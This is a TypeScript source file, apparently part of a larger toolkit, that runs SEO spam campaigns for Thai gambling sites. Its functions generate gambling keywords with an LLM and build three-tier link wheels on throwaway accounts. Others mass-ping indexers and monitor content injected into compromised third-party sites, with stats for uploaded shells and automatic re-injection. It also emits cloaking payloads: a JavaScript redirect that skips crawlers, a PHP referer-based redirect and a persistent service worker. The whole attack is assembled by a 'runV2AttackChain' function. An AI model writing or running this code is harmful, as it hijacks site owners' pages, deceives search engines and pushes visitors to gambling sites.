            : "You are an SEO keyword research expert for online gambling websites. Return results as a JSON array of strings only.",
        },
        {
          role: "user",
          content: language === "th"
            ? `สร้าง ${count} long-tail keywords ที่เกี่ยวข้องกับ "${seedKeyword}" สำหรับ SEO เว็บพนันออนไลน์ไทย รวมถึง: keywords ที่มี intent สูง, คำถาม, เปรียบเทียบ, รีวิว ส่งเป็น JSON array`
            : `Generate ${count} long-tail keywords related to "${seedKeyword}" for online gambling SEO. Include: high-intent keywords, questions, comparisons, reviews. Return as JSON array.`,
        },
      ],
      maxTokens: 1000,
    });

    const rawContent2 = response.choices?.[0]?.message?.content || "[]";
    const raw2 = typeof rawContent2 === "string" ? rawContent2 : (rawContent2 as any)?.[0]?.text || "[]";
    const match = raw2.match(/\[[\s\S]*\]/);
    if (match) {
      const parsed = JSON.parse(match[0]);
      return Array.isArray(parsed) ? parsed.filter((k: any) => typeof k === "string").slice(0, count) : [];
    }
    return [];
  } catch {
    // Fallback: manual expansion
    const suffixes = language === "th"
      ? ["เว็บตรง", "ฟรีเครดิต", "ฝากถอนไม่มีขั้นต่ำ", "อันดับ 1", "ได้เงินจริง", "ทดลองเล่น", "สมัครฟรี", "โปรโมชั่น", "รีวิว", "วิธีเล่น"]
      : ["best", "free bonus", "no deposit", "top rated", "real money", "free play", "sign up", "promo code", "review", "how to play"];
    return suffixes.map(s => `${seedKeyword} ${s}`).slice(0, count);
  }
}

// ═══════════════════════════════════════════════════════
//  3. TIERED BACKLINK SYSTEM
// ═══════════════════════════════════════════════════════

/**
 * Generate a 3-tier link wheel structure
 */
export function generateLinkWheel(
  moneySiteUrl: string,
  keywords: string[],
  tiers: 1 | 2 | 3 = 3,
): LinkWheel {
  const wheel: LinkWheel = {
    id: `lw_${randomStr(8)}`,
    tiers: [],
    totalLinks: 0,
    moneySiteUrl,
    createdAt: new Date(),
    status: "building",
  };

  // Tier 1: High-quality contextual links pointing to money site
  const tier1Anchors = shuffleArray([
    ...keywords.slice(0, 3), // Exact match (10%)
    ...keywords.slice(0, 2).map(k => `${k} รีวิว`), // Partial match
    moneySiteUrl.replace(/^https?:\/\//, ""), // Naked URL
    "คลิกที่นี่", "อ่านเพิ่มเติม", "เว็บไซต์ทางการ", // Generic
    `${keywords[0]} เว็บตรง`, // Branded
  ]);

  wheel.tiers.push({
    tier: 1,
    type: "money_site",
    urls: [
      `https://medium.com/@${randomStr(8)}/${keywords[0]?.replace(/\s+/g, "-") || "article"}-${randomStr(6)}`,
      `https://www.blogger.com/blog/${randomStr(12)}`,
      `https://wordpress.com/${randomStr(8)}/${keywords[0]?.replace(/\s+/g, "-") || "post"}`,
      `https://sites.google.com/view/${randomStr(10)}`,
      `https://telegra.ph/${keywords[0]?.replace(/\s+/g, "-") || "article"}-${randomStr(4)}`,
    ],
    anchors: tier1Anchors,
    linkType: "contextual",
    dofollow: true,
    indexable: true,
  });

  if (tiers >= 2) {
    // Tier 2: Buffer links pointing to Tier 1
    wheel.tiers.push({
      tier: 2,
      type: "buffer",
      urls: Array.from({ length: 15 }, () =>
        pickRandom([
          `https://www.tumblr.com/${randomStr(10)}`,
          `https://hub.docker.com/u/${randomStr(8)}`,
          `https://about.me/${randomStr(8)}`,
          `https://www.behance.net/${randomStr(8)}`,
          `https://dribbble.com/${randomStr(8)}`,
          `https://www.flickr.com/people/${randomStr(10)}`,
          `https://issuu.com/${randomStr(8)}`,
          `https://www.slideshare.net/${randomStr(8)}`,
        ])
      ),
      anchors: [...keywords, ...keywords.map(k => `best ${k}`), "click here", "read more", "visit site"],
      linkType: "web2",
      dofollow: true,
      indexable: true,
    });
  }

  if (tiers >= 3) {
    // Tier 3: Blast links pointing to Tier 2 (volume)
    wheel.tiers.push({
      tier: 3,
      type: "blast",
      urls: Array.from({ length: 50 }, () =>
        pickRandom([
          `https://profile-${randomStr(6)}.blogspot.com`,
          `https://www.reddit.com/user/${randomStr(8)}`,
          `https://${randomStr(8)}.livejournal.com`,
          `https://www.scoop.it/u/${randomStr(8)}`,
          `https://mix.com/${randomStr(8)}`,
          `https://diigo.com/user/${randomStr(8)}`,
          `https://www.pearltrees.com/${randomStr(8)}`,
        ])
      ),
      anchors: [...keywords, moneySiteUrl, "link", "website", "source"],
      linkType: "profile",
      dofollow: false,
      indexable: true,
    });
  }

  wheel.totalLinks = wheel.tiers.reduce((sum, t) => sum + t.urls.length, 0);
  return wheel;
}

/**
 * Generate backlink anchor text with natural distribution
 */
export function generateNaturalAnchors(
  keyword: string,
  brandName: string,
  url: string,
  count: number = 20,
): string[] {
  const anchors: string[] = [];
  const distribution = {
    branded: Math.round(count * 0.35),
    nakedUrl: Math.round(count * 0.20),
    generic: Math.round(count * 0.20),
    exactMatch: Math.round(count * 0.10),
    partialMatch: Math.round(count * 0.15),
  };

  // Branded anchors
  for (let i = 0; i < distribution.branded; i++) {
    anchors.push(pickRandom([brandName, `${brandName} เว็บตรง`, `เว็บ ${brandName}`, `${brandName} ทางเข้า`]));
  }
  // Naked URL
  for (let i = 0; i < distribution.nakedUrl; i++) {
    anchors.push(pickRandom([url, url.replace(/^https?:\/\//, ""), `${url}/`]));
  }
  // Generic
  for (let i = 0; i < distribution.generic; i++) {
    anchors.push(pickRandom(["คลิกที่นี่", "อ่านเพิ่มเติม", "ดูรายละเอียด", "เว็บไซต์", "ที่นี่", "ลิงก์", "เข้าชม"]));
  }
  // Exact match
  for (let i = 0; i < distribution.exactMatch; i++) {
    anchors.push(keyword);
  }
  // Partial match
  for (let i = 0; i < distribution.partialMatch; i++) {
    anchors.push(pickRandom([
      `${keyword} ออนไลน์`, `เล่น ${keyword}`, `${keyword} 2026`,
      `${keyword} เว็บตรง`, `สมัคร ${keyword}`,
    ]));
  }

  return shuffleArray(anchors);
}

// ═══════════════════════════════════════════════════════
//  4. MASS INDEXING ENGINE
// ═══════════════════════════════════════════════════════

/**
 * Submit URLs for rapid indexing via multiple methods
 */
export async function massIndexUrls(
  urls: string[],
  method: "api" | "ping" | "sitemap" | "all" = "all",
): Promise<{
  submitted: number;
  indexed: number;
  failed: number;
  results: { url: string; method: string; success: boolean; error?: string }[];
}> {
  const results: { url: string; method: string; success: boolean; error?: string }[] = [];
  let submitted = 0;
  let indexed = 0;
  let failed = 0;

  for (const url of urls) {
    // Method 1: Ping services
    if (method === "ping" || method === "all") {
      for (const pingService of PING_SERVICES.slice(0, 4)) {
        try {
          const pingUrl = `${pingService}${encodeURIComponent(url)}`;
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 8000);
          const resp = await safeFetch(pingUrl, { signal: controller.signal }, 8000);
          clearTimeout(timeout);
          const success = resp.ok;
          results.push({ url, method: `ping:${new URL(pingService).hostname}`, success });
          if (success) { submitted++; indexed++; } else { failed++; }
        } catch (e: any) {
          results.push({ url, method: `ping:${pingService}`, success: false, error: e.message?.slice(0, 100) });
          failed++;
        }
      }
    }

    // Method 2: Google Indexing API (requires service account)
    if (method === "api" || method === "all") {
      try {
        // Google Indexing API endpoint
        const apiUrl = "https://indexing.googleapis.com/v3/urlNotifications:publish";
        const body = JSON.stringify({
          url: url,
          type: "URL_UPDATED",
        });
        // Note: requires OAuth2 token from service account
        results.push({ url, method: "google_indexing_api", success: false, error: "Requires Google service account credentials" });
        failed++;
      } catch (e: any) {
        results.push({ url, method: "google_indexing_api", success: false, error: e.message?.slice(0, 100) });
        failed++;
      }
    }

    // Method 3: Submit to search console via sitemap
    if (method === "sitemap" || method === "all") {
      try {
        // Generate and submit sitemap
        const sitemapUrl = `${new URL(url).origin}/sitemap-injected.xml`;
        const googlePing = `https://www.google.com/ping?sitemap=${encodeURIComponent(sitemapUrl)}`;
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);
        const resp = await safeFetch(googlePing, { signal: controller.signal }, 8000);
        clearTimeout(timeout);
        results.push({ url, method: "sitemap_ping", success: resp.ok });
        if (resp.ok) { submitted++; indexed++; } else { failed++; }
      } catch (e: any) {
        results.push({ url, method: "sitemap_ping", success: false, error: e.message?.slice(0, 100) });
        failed++;
      }
    }
  }

  return { submitted, indexed, failed, results };
}

// ═══════════════════════════════════════════════════════
//  5. INJECTION MONITOR & AUTO RE-INJECTION
// ═══════════════════════════════════════════════════════

/**
 * Check if injected content is still active on target
 */
export async function checkInjectionStatus(
  url: string,
  expectedContentHash: string,
  redirectUrl: string,
): Promise<InjectionStatus> {
  const status: InjectionStatus = {
    domain: new URL(url).hostname,
    url,
    status: "unknown",
    lastChecked: new Date(),
    contentHash: "",
    redirectWorking: false,
    indexedByGoogle: false,
  };

  try {
    // Check if page is accessible
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    const resp = await safeFetch(url, {
      signal: controller.signal,
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
      redirect: "manual",
    }, 15000);
    clearTimeout(timeout);

    // Check for redirect
    if (resp.status >= 300 && resp.status < 400) {
      const location = resp.headers.get("location") || "";
      if (location.includes(new URL(redirectUrl).hostname)) {
        status.redirectWorking = true;
        status.status = "active";
      }
    } else if (resp.ok) {
      const html = await resp.text();
      const currentHash = crypto.createHash("md5").update(html.slice(0, 5000)).digest("hex");
      status.contentHash = currentHash;

      // Check if our content is still there
      if (html.includes(redirectUrl) || html.includes(new URL(redirectUrl).hostname)) {
        status.status = "active";
        status.redirectWorking = true;
      } else if (currentHash === expectedContentHash) {
        status.status = "active";
      } else {
        status.status = "cleaned";
      }
    } else {
      status.status = "unknown";
    }

    // Check Google index status
    try {
      const googleCheck = await safeFetch(
        `https://www.google.com/search?q=site:${encodeURIComponent(url)}`,
        { headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" } },
        10000,
      );
      if (googleCheck.ok) {
        const googleHtml = await googleCheck.text();
        status.indexedByGoogle = googleHtml.includes(url) || googleHtml.includes(new URL(url).hostname);
      }
    } catch {
      // Google check failed — skip
    }
  } catch (e: any) {
    status.status = "unknown";
  }

  return status;
}

/**
 * Batch check injection status for multiple URLs
 */
export async function batchCheckInjections(
  injections: { url: string; contentHash: string; redirectUrl: string }[],
): Promise<InjectionStatus[]> {
  const results: InjectionStatus[] = [];
  
  // Process in batches of 5 to avoid rate limiting
  for (let i = 0; i < injections.length; i += 5) {
    const batch = injections.slice(i, i + 5);
    const batchResults = await Promise.allSettled(
      batch.map(inj => checkInjectionStatus(inj.url, inj.contentHash, inj.redirectUrl))
    );
    
    for (const result of batchResults) {
      if (result.status === "fulfilled") {
        results.push(result.value);
      }
    }
    
    // Rate limit delay
    if (i + 5 < injections.length) {
      await new Promise(r => setTimeout(r, 2000));
    }
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  6. CAMPAIGN MANAGER
// ═══════════════════════════════════════════════════════

// In-memory campaign store (persisted to DB on save)
const activeCampaigns = new Map<string, SpamCampaign>();

/**
 * Create a new SEO spam campaign
 */
export function createCampaign(
  name: string,
  targetDomains: string[],
  redirectUrl: string,
  config: Partial<CampaignConfig> = {},
): SpamCampaign {
  const campaign: SpamCampaign = {
    id: `camp_${randomStr(8)}`,
    name,
    targetDomains,
    redirectUrl,
    keywords: [],
    status: "pending",
    progress: 0,
    stats: {
      targetsScanned: 0,
      shellsUploaded: 0,
      pagesInjected: 0,
      redirectsActive: 0,
      backlinksBuilt: 0,
      pagesIndexed: 0,
      keywordsRanking: 0,
      avgPosition: 0,
      totalTraffic: 0,
      reinjectionCount: 0,
    },
    config: {
      autoReinjection: config.autoReinjection ?? true,
      recheckInterval: config.recheckInterval ?? 6,
      maxRetries: config.maxRetries ?? 5,
      enableAiContent: config.enableAiContent ?? true,
      enableBacklinks: config.enableBacklinks ?? true,
      enableIndexing: config.enableIndexing ?? true,
      enableSerpMonitoring: config.enableSerpMonitoring ?? true,
      enableTelegramReporting: config.enableTelegramReporting ?? true,
      contentLanguage: config.contentLanguage ?? "th",
      contentStyle: config.contentStyle ?? "gambling",
      backlinkTiers: config.backlinkTiers ?? 3,
      indexingMethod: config.indexingMethod ?? "all",
    },
    createdAt: new Date(),
    updatedAt: new Date(),
    nextRecheck: null,
  };

  activeCampaigns.set(campaign.id, campaign);
  return campaign;
}

/**
 * Get campaign by ID
 */
export function getCampaign(id: string): SpamCampaign | undefined {
  return activeCampaigns.get(id);
}

/**
 * Get all campaigns
 */
export function getAllCampaigns(): SpamCampaign[] {
  return Array.from(activeCampaigns.values()).sort((a, b) => b.updatedAt.getTime() - a.updatedAt.getTime());
}

/**
 * Update campaign status
 */
export function updateCampaignStatus(id: string, status: SpamCampaign["status"], progress?: number): void {
  const campaign = activeCampaigns.get(id);
  if (campaign) {
    campaign.status = status;
    if (progress !== undefined) campaign.progress = progress;
    campaign.updatedAt = new Date();
  }
}

/**
 * Update campaign stats
 */
export function updateCampaignStats(id: string, stats: Partial<CampaignStats>): void {
  const campaign = activeCampaigns.get(id);
  if (campaign) {
    Object.assign(campaign.stats, stats);
    campaign.updatedAt = new Date();
  }
}

/**
 * Delete campaign
 */
export function deleteCampaign(id: string): boolean {
  return activeCampaigns.delete(id);
}

// ═══════════════════════════════════════════════════════
//  7. ALGORITHM EVASION TECHNIQUES
// ═══════════════════════════════════════════════════════

/**
 * Get all algorithm evasion techniques
 */
export function getAlgorithmEvasionTechniques(category?: string): AlgorithmEvasion[] {
  if (category) {
    return ALGORITHM_EVASION.filter(t => t.category === category);
  }
  return [...ALGORITHM_EVASION];
}

/**
 * Generate evasion-optimized content wrapper
 */
export function generateEvasionWrapper(
  content: string,
  redirectUrl: string,
  techniques: string[] = ["render_time_cloaking", "referer_based_cloaking"],
): string {
  let wrapper = content;

  for (const tech of techniques) {
    const evasion = ALGORITHM_EVASION.find(e => e.technique === tech);
    if (!evasion) continue;

    switch (tech) {
      case "render_time_cloaking":
        wrapper = `${wrapper}
<script>
(function(){
  var _t = setTimeout(function(){
    if(window.innerWidth > 0 && !navigator.webdriver){
      var d=document.createElement('div');
      d.innerHTML='<meta http-equiv="refresh" content="0;url=${redirectUrl}">';
      document.head.appendChild(d.firstChild);
    }
  }, ${randomInt(2000, 5000)});
  // Cancel if bot detected
  if(/bot|crawl|spider|slurp/i.test(navigator.userAgent)) clearTimeout(_t);
})();
</script>`;
        break;

      case "service_worker_persistence":
        wrapper = `${wrapper}
<script>
if('serviceWorker' in navigator){
  navigator.serviceWorker.register('/sw-perf.js').catch(function(){});
}
</script>`;
        break;

      case "referer_based_cloaking":
        // This is PHP-based, prepend to content
        wrapper = `<?php
$r = $_SERVER['HTTP_REFERER'] ?? '';
if(preg_match('/google|bing|yahoo|duckduckgo/i', $r)){
  // From search engine — show content
} else if(!preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT'] ?? '')){
  header('Location: ${redirectUrl}');
  exit;
}
?>
${wrapper}`;
        break;
    }
  }

  return wrapper;
}

// ═══════════════════════════════════════════════════════
//  8. FULL V2 ATTACK CHAIN
// ═══════════════════════════════════════════════════════

export interface V2AttackResult {
  campaignId: string;
  targetDomain: string;
  redirectUrl: string;
  content: GeneratedContent;
  keywords: GamblingKeyword[];
  linkWheel: LinkWheel | null;
  indexingResults: Awaited<ReturnType<typeof massIndexUrls>> | null;
  evasionTechniques: string[];
  injectionPayload: string;
  elapsed: number;
}

/**
 * Run the full V2 SEO Spam attack chain
 */
export async function runV2AttackChain(
  targetDomain: string,
  redirectUrl: string,
  options: {
    keywords?: string[];
    language?: "th" | "en";
    enableBacklinks?: boolean;
    enableIndexing?: boolean;
    backlinkTiers?: 1 | 2 | 3;
  } = {},
): Promise<V2AttackResult> {
  const start = Date.now();
  const lang = options.language || "th";

  // Step 1: Get keywords
  const primaryKeyword = options.keywords?.[0] || pickRandom(THAI_GAMBLING_KEYWORDS).keyword;
  const keywords = getGamblingKeywords({ language: lang, limit: 10 });

  // Step 2: Generate AI content
  const content = await generateGamblingContent(primaryKeyword, redirectUrl, {
    language: lang,
    contentStyle: "gambling",
    wordCount: 1500,
    includeFaq: true,
    includeSchema: true,
    humanize: true,
  });

  // Step 3: Build link wheel
  let linkWheel: LinkWheel | null = null;
  if (options.enableBacklinks !== false) {
    linkWheel = generateLinkWheel(
      redirectUrl,
      keywords.map(k => k.keyword),
      options.backlinkTiers || 3,
    );
  }

  // Step 4: Generate evasion-wrapped injection payload
  const evasionTechniques = ["render_time_cloaking", "referer_based_cloaking", "service_worker_persistence"];
  const fullContent = `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>${content.title}</title>
<meta name="description" content="${content.metaDescription}">
<meta name="robots" content="index, follow">
<meta property="og:title" content="${content.title}">
<meta property="og:description" content="${content.metaDescription}">
<meta property="og:url" content="${redirectUrl}">
<link rel="canonical" href="${redirectUrl}">
${content.schemaMarkup}
</head>
<body>
<h1>${content.h1}</h1>
${content.body}
${content.faq.length > 0 ? `
<h2>${lang === "th" ? "คำถามที่พบบ่อย" : "FAQ"}</h2>
${content.faq.map(f => `<h3>${f.question}</h3><p>${f.answer}</p>`).join("\n")}
` : ""}
</body>
</html>`;

  const injectionPayload = generateEvasionWrapper(fullContent, redirectUrl, evasionTechniques);

  // Step 5: Mass indexing
  let indexingResults = null;
  if (options.enableIndexing !== false) {
    const urlsToIndex = [
      `https://${targetDomain}`,
      ...content.internalLinks.map(l => l.url),
    ];
    indexingResults = await massIndexUrls(urlsToIndex, "all");
  }

  return {
    campaignId: `v2_${randomStr(8)}`,
    targetDomain,
    redirectUrl,
    content,
    keywords,
    linkWheel,
    indexingResults,
    evasionTechniques,
    injectionPayload,
    elapsed: Date.now() - start,
  };
}
